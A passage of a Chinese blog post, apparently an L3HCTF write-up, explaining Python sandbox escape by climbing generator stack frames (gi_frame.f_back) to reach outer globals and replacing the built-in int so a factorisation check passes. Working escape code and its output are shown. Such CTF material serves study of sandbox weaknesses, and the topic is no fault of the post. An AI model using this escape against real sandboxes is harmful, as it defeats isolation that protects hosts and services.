+<p>这里的if条件是：首先p和q都得大于100000，其次就是p和q的积为int(“69…97863”)</p>
+<p>按照题目要求，如果通过算法在要求的5秒实现基本上是不可能的，但是我们可以通过沙箱外的globals的<code>__builtins__</code>字段去修改int函数，实现绕过if语句，这道题的解题思路就是通过栈帧对象逃逸出沙箱从而获取到沙箱外的globals。</p>
+<p>由于这里的<code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code>，那么就无法使用next()和send()了。但还可以使用生成器的表达式，为什么必须用生成器，主要还是因为它的属性gi_frame可以获得当前栈帧对象，当然sys._getframe()等也可以获得栈帧对象，不过需要引入sys模块。</p>
+<p>用生成器的表达式获得栈帧对象</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+
+<p>简单解释一下：看来上面的生成器表达式这里其实就是，先执行i&#x3D;1，然后执行a.gi_frame.f_back.f_back，这里并没有用到生成器的特性，只是单纯利用生成器来获得栈帧属性。</p>
+<p><code>a=[x for x in a][0]</code>等价于<code>next(a)</code>和<code>list(a)</code>，就是迭代执行嘛。至于两个f_back是从下依次向上返回。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;frame at <span class="number">0x000001C18B6BA130</span>, file <span class="string">&#x27;D:\\yinwenmingtwo\\PythonCode\\测试\\22.py&#x27;</span>, line <span class="number">4</span>, code &lt;module&gt;&gt;</span><br><span class="line">&lt;frame at <span class="number">0x0000027CB3830580</span>, file <span class="string">&#x27;D:\\yinwenmingtwo\\PythonCode\\测试\\22.py&#x27;</span>, line <span class="number">3</span>, code &lt;listcomp&gt;&gt;</span><br><span class="line">&lt;frame at <span class="number">0x000001BDF5F45040</span>, file <span class="string">&#x27;D:\\yinwenmingtwo\\PythonCode\\测试\\22.py&#x27;</span>, line <span class="number">1</span>, code &lt;genexpr&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>理解到沙箱逃逸全局了后面就没什么了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_int</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100001</span> * <span class="number">100002</span></span><br><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line">builtin =a.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]</span><br><span class="line">builtin.<span class="built_in">int</span>=fake_int</span><br></pre></td></tr></table></figure>
+
+<p>这里就是重写了int方法来满足if条件。</p>
+<p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=L5pQzt8q4D&alichlgref=https://www.google.com/#toc-7">https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DL5pQzt8q4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://gaorenyusi.online">GAOREN</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://gaorenyusi.online/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://gaorenyusi.online/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gaorenyusi.online" target="_blank">GRYS的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a></div><div class="post_share"><div class="social-share" data-image="https://erji.gaorenyusi.online/img/13.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/05/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析"><img class="cover" src="https://erji.gaorenyusi.online/img/3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">URLDNS链分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://erji.gaorenyusi.online/img/4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">GAOREN</div><div class="author-info__description">人生不只风和雨</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://gaorenyusi.github.io"><i class="fab fa-github"></i><span>Come On</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://b23.tv/2x1oLWz" target="_blank" title="B站"><i class="fab fa-bilibili"></i></a><a class="social-icon" href="http://106.53.212.184/" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://106.53.212.184/" target="_blank" title="微信"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome To Blog Of GAOREN!!! Hope you find these articles helpful!!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">一、生成器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%A0%88%E5%B8%A7-frame"><span class="toc-number">2.</span> <span class="toc-text">二、栈帧(frame)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">三、生成器的属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">四、利用栈帧沙箱逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">五、简单绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BE%8B%E9%A2%98"><span class="toc-number">6.</span> <span class="toc-text">六、例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2024L3HCTF"><span class="toc-number">6.1.</span> <span class="toc-text">2024L3HCTF</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python栈帧沙箱逃逸"><img src="https://erji.gaorenyusi.online/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python栈帧沙箱逃逸"/></a><div class="content"><a class="title" href="/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python栈帧沙箱逃逸">python栈帧沙箱逃逸</a><time datetime="2024-06-11T14:45:36.000Z" title="发表于 2024-06-11 22:45:36">2024-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/05/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析"><img src="https://erji.gaorenyusi.online/img/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS链分析"/></a><div class="content"><a class="title" href="/2024/06/05/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析">URLDNS链分析</a><time datetime="2024-06-05T05:27:36.000Z" title="发表于 2024-06-05 13:27:36">2024-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化"><img src="https://erji.gaorenyusi.online/img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化"/></a><div class="content"><a class="title" href="/2024/06/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化">java反序列化</a><time datetime="2024-06-03T09:31:05.000Z" title="发表于 2024-06-03 17:31:05">2024-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/03/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" title="java反射机制"><img src="https://erji.gaorenyusi.online/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反射机制"/></a><div class="content"><a class="title" href="/2024/06/03/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" title="java反射机制">java反射机制</a><time datetime="2024-06-03T05:30:03.000Z" title="发表于 2024-06-03 13:30:03">2024-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/26/nodejs-vm/" title="nodejs VM和VM2沙箱逃逸"><img src="https://erji.gaorenyusi.online/img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nodejs VM和VM2沙箱逃逸"/></a><div class="content"><a class="title" href="/2024/03/26/nodejs-vm/" title="nodejs VM和VM2沙箱逃逸">nodejs VM和VM2沙箱逃逸</a><time datetime="2024-03-26T11:44:34.000Z" title="发表于 2024-03-26 19:44:34">2024-03-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">王国维</p><div class="bg-ad"><div>人生只似风前絮，欢也零星，悲也零星，都作连江点点萍。</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://so.gushiwen.cn/mingju/juv_49eedb4b8d5d.aspx">至理名言</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">修仙导航</p><ul class="ft-links"><li><a target="_blank" rel="noopener" href="https://fe32.top/about/">关于博主</a><a target="_blank" rel="noopener" href="https://fe32.top/archives/">文章归档</a></li><li><a target="_blank" rel="noopener" href="https://fe32.top/categories/">文章分类</a><a target="_blank" rel="noopener" href="https://fe32.top/tags/">文章标签</a></li><li><a target="_blank" rel="noopener" href="https://fe32.top/specialEffects/">一些特效</a><a target="_blank" rel="noopener" href="https://fe32.top/wallpaper/">一些壁纸</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.zafkiel3.com/"><img src="https://www.zafkielpic.cc/img/p9.jpg" alt="zafkiel3"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung"><img src="https://pic.cnblogs.com/avatar/3450279/20240519153833.png" alt="yuy0ung"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fupanc.github.io/"><img src="https://fupanc.github.io/images/index.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.pri87.vip/"><img src="https://tuchuang.voooe.cn/images/2023/12/11/8A3D3D2AD9542D84681D819FBA82A227.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fe32.top/"><img src="https://bu.dusays.com/2022/05/02/626f92e193879.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fe32.top/"><img src="https://bu.dusays.com/2022/05/02/626f92e193879.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fe32.top/"><img src="https://bu.dusays.com/2022/05/02/626f92e193879.jpg" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fe32.top/"><img src="https://bu.dusays.com/2022/05/02/626f92e193879.jpg" alt=""/></a></div></div></div></div><div class="footer_custom_text"><a target="_blank" href="https://wap.miit.gov.cn/" >中国万岁！！！</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer src="https://rmt.dogedoge.com/fetch/~/source/jsdelivr/npm/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/gh/sirxemic/jquery.ripples/dist/jquery.ripples.js"></script><script defer data-pjax src="/js/ripples.js"></script><script async data-pjax src="/js/custom/randombg.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
